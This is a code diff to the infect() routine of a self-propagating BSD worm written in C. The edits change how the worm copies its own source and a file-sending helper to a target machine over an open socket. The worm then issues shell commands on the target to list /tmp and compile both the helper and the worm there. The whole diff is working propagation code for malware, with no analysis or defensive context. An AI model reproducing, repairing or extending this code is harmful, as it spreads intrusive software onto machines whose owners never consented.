@@ -107,7 +107,7 @@ void infect(ip)
     printf("[*] Forking to create send_file process\n");
 
     if (fork() == 0) {
-        argv[0] = "send_file_over_socket_bsd";
+        argv[0] = "send_file_over_socket_bsd.c";
         argv[1] = "worm_bsd.c";
         argv[2] = "worm_bsd.h";
         argv[3] = (char *)0;
@@ -128,9 +128,12 @@ void infect(ip)
     printf("[*] DEBUG: Checking /tmp contents on target...\n");
     write_to_sock(sock, "ls -l /tmp/worm_bsd*\n");
     sleep(2);
-    bzero(io_buf, IO_BUF_SIZE);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
-    printf("--- TARGET /TMP CONTENTS ---\n%s\n----------------------------\n", io_buf);
+
+    printf("[*] Compile send_file_over_socket_bsd.c on target\n");
+    write_to_sock(sock, "cd /tmp; cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Compiling worm_bsd.c on target\n");
     write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
